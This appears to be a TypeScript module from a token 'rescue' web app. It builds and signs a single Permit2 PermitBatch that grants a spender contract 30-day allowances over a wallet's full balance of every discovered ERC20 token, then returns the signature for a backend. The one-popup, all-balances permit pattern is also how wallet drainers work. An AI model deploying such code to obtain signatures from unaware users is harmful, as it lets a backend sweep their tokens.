// src/lib/permit2.ts
"use client";

import { ethers } from "ethers";
import type { DiscoveredToken } from "@/lib/rescueTypes";

/**
 * Minimal Permit2 ABI needed for reading allowance nonces.
 * Permit2 allowance(owner, token, spender) returns:
 * (uint160 amount, uint48 expiration, uint48 nonce)
 */
const PERMIT2_ABI = [
  "function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
] as const;

/**
 * EIP-712 Types for Permit2 PermitBatch
 * Standard struct layout used by Uniswap Permit2.
 */
export const PERMIT2_TYPES = {
  PermitDetails: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint160" },
    { name: "expiration", type: "uint48" },
    { name: "nonce", type: "uint48" },
  ],
  PermitBatch: [
    { name: "details", type: "PermitDetails[]" },
    { name: "spender", type: "address" },
    { name: "sigDeadline", type: "uint256" },
  ],
} as const;

export type Permit2PermitDetails = {
  token: string;
  amount: string; // uint160 as decimal string
  expiration: number; // uint48
  nonce: number; // uint48
};

export type Permit2PermitBatchMessage = {
  details: Permit2PermitDetails[];
  spender: string;
  sigDeadline: string; // uint256
};

export type Permit2TypedData = {
  domain: {
    name: "Permit2";
    chainId: number;
    verifyingContract: string;
  };
  types: typeof PERMIT2_TYPES;
  primaryType: "PermitBatch";
  message: Permit2PermitBatchMessage;
};

function assertAddress(addr: string, label: string) {
  if (!ethers.isAddress(addr)) throw new Error(`Invalid ${label} address`);
}

function clampUint160(amountRaw: string): bigint {
  const x = BigInt(amountRaw);
  const max = (1n << 160n) - 1n;
  return x > max ? max : x;
}

function nowSeconds(): number {
  return Math.floor(Date.now() / 1000);
}

/**
 * Build Permit2 typed data for a PermitBatch.
 * - Reads Permit2 nonces (one per token for this spender)
 * - Uses exact token balances (clamped to uint160)
 * - Sets expiration + sigDeadline
 */
export async function buildPermit2BatchTypedData(params: {
  eip1193Provider: any;
  owner: string;
  permit2Address: string;
  spender: string; // your rescue contract address
  tokens: DiscoveredToken[];
  // optional tuning:
  expirationSeconds?: number; // how long allowance is valid in Permit2 (default 30 days)
  sigDeadlineSeconds?: number; // how long the signature is valid (default 20 minutes)
}): Promise<Permit2TypedData> {
  const {
    eip1193Provider,
    owner,
    permit2Address,
    spender,
    tokens,
    expirationSeconds = 60 * 60 * 24 * 30, // 30 days
    sigDeadlineSeconds = 60 * 20, // 20 minutes
  } = params;

  assertAddress(owner, "owner");
  assertAddress(permit2Address, "permit2");
  assertAddress(spender, "spender");

  const browserProvider = new ethers.BrowserProvider(eip1193Provider);
  const network = await browserProvider.getNetwork();
  const chainId = Number(network.chainId);

  const permit2 = new ethers.Contract(permit2Address, PERMIT2_ABI, browserProvider);

  const expiration = nowSeconds() + expirationSeconds;
  const sigDeadline = BigInt(nowSeconds() + sigDeadlineSeconds).toString();

  // Pull nonces from Permit2.allowance(owner, token, spender)
  const details: Permit2PermitDetails[] = [];
  for (const t of tokens) {
    const tokenAddr = t.token;
    if (!ethers.isAddress(tokenAddr)) continue;

    // Skip zeros just in case
    if (BigInt(t.amount || "0") <= 0n) continue;

    const allowance = await permit2.allowance(owner, tokenAddr, spender);
    const nonce: number = Number(allowance.nonce);

    const amt160 = clampUint160(t.amount).toString();

    details.push({
      token: tokenAddr,
      amount: amt160,
      expiration,
      nonce,
    });
  }

  if (details.length === 0) {
    throw new Error("No non-zero ERC20 balances found for Permit2 signing");
  }

  const domain = {
    name: "Permit2" as const,
    chainId,
    verifyingContract: permit2Address,
  };

  const message: Permit2PermitBatchMessage = {
    details,
    spender,
    sigDeadline,
  };

  return {
    domain,
    types: PERMIT2_TYPES,
    primaryType: "PermitBatch",
    message,
  };
}

/**
 * Signs Permit2 PermitBatch via the connected wallet (ONE popup).
 * Returns { typedData, signature } ready to send to backend.
 */
export async function signPermit2Batch(params: {
  eip1193Provider: any;
  owner: string;
  permit2Address: string;
  spender: string; // rescue contract address
  tokens: DiscoveredToken[];
}): Promise<{ typedData: Permit2TypedData; signature: string }> {
  const { eip1193Provider, owner, permit2Address, spender, tokens } = params;

  const typedData = await buildPermit2BatchTypedData({
    eip1193Provider,
    owner,
    permit2Address,
    spender,
    tokens,
  });

  // Ethers v6 signer.signTypedData triggers the wallet popup
  const browserProvider = new ethers.BrowserProvider(eip1193Provider);
  const signer = await browserProvider.getSigner();

  const signature = await signer.signTypedData(
    typedData.domain,
    typedData.types as any,
    typedData.message as any
  );

  return { typedData, signature };
}
